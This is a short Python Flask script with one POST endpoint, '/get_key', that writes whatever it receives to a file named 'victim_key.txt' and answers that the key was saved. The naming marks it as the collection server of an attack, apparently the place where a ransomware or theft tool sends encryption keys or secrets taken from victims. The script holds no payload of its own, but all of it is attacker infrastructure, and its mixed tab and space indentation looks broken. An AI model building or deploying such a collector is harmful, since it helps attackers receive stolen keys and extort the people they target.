from flask import Flask, request

app = Flask(__name__)

@app.route('/get_key', methods=['POST'])
def get_key():
	data = request.get_data(as_text=True)
	with open('victim_key.txt', 'w') as file:
        	file.write(data)
	return f"The key was saved successfully!"

if __name__ == '__main__':
    app.run(debug=True)
